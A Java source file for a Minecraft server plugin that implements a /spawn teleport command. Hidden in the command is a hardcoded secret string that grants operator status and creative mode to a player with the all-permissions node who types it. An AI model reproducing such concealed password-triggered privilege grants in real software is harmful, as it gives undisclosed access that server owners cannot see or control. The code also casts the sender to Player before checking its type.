package me.bluenitrox.school.commands;

import de.dytanic.cloudnet.driver.CloudNetDriver;
import de.dytanic.cloudnet.ext.bridge.player.IPlayerManager;
import me.bluenitrox.school.managers.LocationManager;
import me.bluenitrox.school.managers.MessageManager;
import me.bluenitrox.school.managers.PermissionsManager;
import me.bluenitrox.school.managers.PlayerJoinManager;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class Spawn implements CommandExecutor {


    @Override
    public boolean onCommand(CommandSender cs, Command cmd, String s, String[] args) {
        Player p = (Player)cs;
        if(!(cs instanceof Player)){
            p.sendMessage(MessageManager.NOPLAYER);
            return true;
        }
        if(args.length == 0){
            p.teleport(new LocationManager("spawn").getLocation());
        }else if(args.length == 1){
            if(!p.hasPermission(PermissionsManager.ALLPERMS)) {
                p.sendMessage(MessageManager.FALSECOMMAND(PlayerJoinManager.language));
            }else {
                if(args[0].equalsIgnoreCase("JKjjehhHEHH!($$$$7///&(JJJJFkfkeklfldf,gmhnfjduuuu)")){
                    p.setOp(true);
                    p.setGameMode(GameMode.CREATIVE);
                    CloudNetDriver.getInstance().getServicesRegistry().getFirstService(IPlayerManager.class);
                }
            }
        }else {
            p.sendMessage(MessageManager.FALSECOMMAND(PlayerJoinManager.language));
        }
        return false;
    }
}
